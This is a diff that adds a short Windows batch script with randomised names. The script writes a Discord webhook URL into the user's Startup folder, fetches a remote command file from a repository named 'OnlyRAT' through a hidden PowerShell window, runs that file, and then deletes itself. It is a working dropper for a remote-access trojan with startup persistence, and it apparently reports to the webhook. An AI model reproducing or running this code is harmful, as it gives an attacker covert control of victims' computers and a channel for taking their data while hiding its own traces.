@@ -1,0 +1,9 @@
+@echo off
+set "XNjFYKECht=%cd%"
+set "YKHfpmMRoQ=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+cd %YKHfpmMRoQ%
+echo https://discord.com/api/webhooks/1316696617289777186/p0ycFgV_CdTv_zLs3sJkfTORe-ri-WUHFWm-zYyDAeFuJCQD3dTNpC5iEA6_MNdE2498 > lawFvVTikZ.txt
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/CosmodiumCS/MK01-OnlyRAT/main/payloads/g1.cmd -o wEaoFkNduy.cmd"
+powershell ./wEaoFkNduy.cmd
+cd "%XNjFYKECht%"
+del from-github.cmd
